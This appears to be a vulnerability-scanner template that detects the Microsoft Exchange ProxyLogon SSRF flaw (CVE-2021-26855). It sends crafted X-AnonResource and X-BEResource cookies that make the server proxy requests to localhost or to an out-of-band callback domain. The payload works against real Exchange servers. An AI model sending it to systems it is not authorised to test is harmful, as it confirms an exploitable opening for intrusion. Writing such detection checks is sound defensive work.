name: yaml-poc-microsoft-exchange_server-logical-CVE-2021-26855
binding: fd33e5b7-97d9-4ae9-89c3-115648ec9ab2
manual: false
detail:
    author: zhixiong.chen
    links:
        - http://help.aliyun.com/noticelist/articleid/1060812493.html
        - http://packetstormsecurity.com/files/161846/Microsoft-Exchange-2019-SSRF-Arbitrary-File-Write.html
        - http://packetstormsecurity.com/files/161938/Microsoft-Exchange-ProxyLogon-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/162610/Microsoft-Exchange-2019-Unauthenticated-Email-Download.html
        - http://packetstormsecurity.com/files/162736/Microsoft-Exchange-ProxyLogon-Collector.html
        - https://cxsecurity.com/issue/WLB-2021050123
        - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855
        - https://nvd.nist.gov/vuln/detail/CVE-2021-26855
        - https://packetstormsecurity.com/files/161846/Microsoft-Exchange-2019-SSRF-Arbitrary-File-Write.html
        - https://packetstormsecurity.com/files/161938/Microsoft-Exchange-ProxyLogon-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/162610/Microsoft-Exchange-2019-Unauthenticated-Email-Download.html
        - https://packetstormsecurity.com/files/162736/Microsoft-Exchange-ProxyLogon-Collector.html
        - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26855
        - https://vigilance.fr/vulnerability/Microsoft-Exchange-Server-multiple-vulnerabilities-34736
        - https://www.exploit-db.com/exploits/49879
        - https://www.exploit-db.com/exploits/49895
        - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
    vulnerability:
        id: 8e100e7d-845f-4b16-90a1-0148dbae04c0
        level: critical
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseDomain: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /owa/auth/x.js
            headers:
                Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
            follow_redirects: false
        expression: response.status == 500 && response.headers["X-CalculatedBETarget"].icontains("localhost")
    r1:
        request:
            cache: true
            method: GET
            path: /owa/auth/x.js
            headers:
                Cookie: X-AnonResource=true; X-AnonResource-Backend={{reverseDomain}}/ecp/default.flt?~3; X-BEResource={{reverseDomain}}/owa/auth/logon.aspx?~3;
            follow_redirects: false
        expression: reverse.wait(5)
expression: r0() || r1()
